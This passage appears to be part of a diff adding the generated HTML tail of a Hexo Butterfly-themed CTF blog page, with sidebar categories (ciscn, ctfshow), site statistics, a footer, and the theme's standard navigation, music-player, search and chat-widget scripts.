href="/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/" title="ciscn2024的一些反思"><img src="https://i.postimg.cc/XJZWyzfz/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ciscn2024的一些反思"/></a><div class="content"><a class="title" href="/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/" title="ciscn2024的一些反思">ciscn2024的一些反思</a><time datetime="2024-07-18T08:45:41.000Z" title="发表于 2024-07-18 16:45:41">2024-07-18</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/ciscn/"><span class="card-category-list-name">ciscn</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/ctfshow/"><span class="card-category-list-name">ctfshow</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/pollute/"><span class="card-category-list-name">pollute</span><span class="card-category-list-count">1</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/ciscn2024/" style="font-size: 1.1em; color: #999">ciscn2024</a> <a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.1em; color: #999">实验</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 1.5em; color: #99a9bf">复现</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><span class="card-archive-list-count">6</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">6</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">11.1k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-08-02T02:41:07.759Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/2.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Gu0f3n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>(() => {
+  const panguFn = () => {
+    if (typeof pangu === 'object') pangu.autoSpacingPage()
+    else {
+      btf.getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
+        .then(() => {
+          pangu.autoSpacingPage()
+        })
+    }
+  }
+
+  const panguInit = () => {
+    if (false){
+      GLOBAL_CONFIG_SITE.isPost && panguFn()
+    } else {
+      panguFn()
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', panguInit, 'pangu')
+  document.addEventListener('DOMContentLoaded', panguInit)
+})()</script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><div class="aplayer no-destroy" data-id="12384198565" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><div class="fb-customerchat" id="fb-customer-chat" attribution="biz_inbox"></div><script>(() => {
+  document.getElementById('fb-root') ? '' : document.body.insertAdjacentHTML('afterend', '<div id="fb-root"></div>')
+
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml: true,
+      version: 'v16.0'
+    });
+  };
+
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = 'https://connect.facebook.net/zh_CN/sdk/xfbml.customerchat.js';
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    window.chatBtnFn = () => {
+      const isShow = document.querySelector('.fb_customer_chat_bounce_in_v2')
+      isShow ? FB.CustomerChat.hide() : FB.CustomerChat.show()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => {
+        FB.CustomerChat.hide()
+      },
+      show: () => {
+        FB.CustomerChat.show(false)
+      }
+    }
+  }
+})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const loadMeting = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'loadMeting')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+const triggerPjaxFn = (val) => {
+  if (!val) return
+  Object.values(val).forEach(fn => { fn() })
+}
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  triggerPjaxFn(window.globalFn.pjaxSend)
+})
+
+document.addEventListener('pjax:complete', () => {
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  triggerPjaxFn(window.globalFn.pjaxComplete)
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.14.0-b3"></script></div></div></body></html>
